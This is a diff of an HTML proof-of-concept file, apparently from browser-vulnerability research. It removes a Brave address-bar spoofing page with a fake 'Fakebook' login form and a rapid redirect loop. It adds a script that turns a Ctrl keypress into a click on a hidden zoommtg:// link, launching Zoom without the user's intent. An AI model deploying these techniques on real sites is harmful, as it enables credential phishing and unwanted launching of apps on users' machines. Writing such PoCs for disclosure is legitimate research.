@@ -1,14 +1,34 @@
+<!DOCTYPE html>
 <html>
-<title>Address Bar spoofing Brave</title>
-<h1> This is Fakebook </h1>
-<form>
-Email: <input type="text" name="username" placeholder="add email"><br>
-Password: <input type="text" name="password" placeholder="pass">
-<script>
-function f()
-{
-location = "https://facebook.com"
-}
-setInterval("f()", 10);
-</script>
+<head>
+  <title>PoC</title>
+</head>
+<body>
+  <a id="zoomLink" href="zoommtg://zoom.us/join?confno=123456&pwd=abcdef">
+    Ctrl + A
+  </a>
+
+  <script>
+    let ctrlTimer = null;
+    const holdDuration = 5;
+
+    document.addEventListener('keydown', (e) => {
+      // Hanya mulai timer saat Ctrl pertama kali ditekan
+      if (e.key === 'Control' && ctrlTimer === null) {
+        ctrlTimer = setTimeout(() => {
+          const link = document.getElementById('zoomLink');
+          if (link) link.click();
+          ctrlTimer = null;
+        }, holdDuration);
+      }
+    });
+
+    document.addEventListener('keyup', (e) => {
+      if (e.key === 'Control' && ctrlTimer !== null) {
+        clearTimeout(ctrlTimer);
+        ctrlTimer = null;
+      }
+    });
+  </script>
+</body>
 </html>
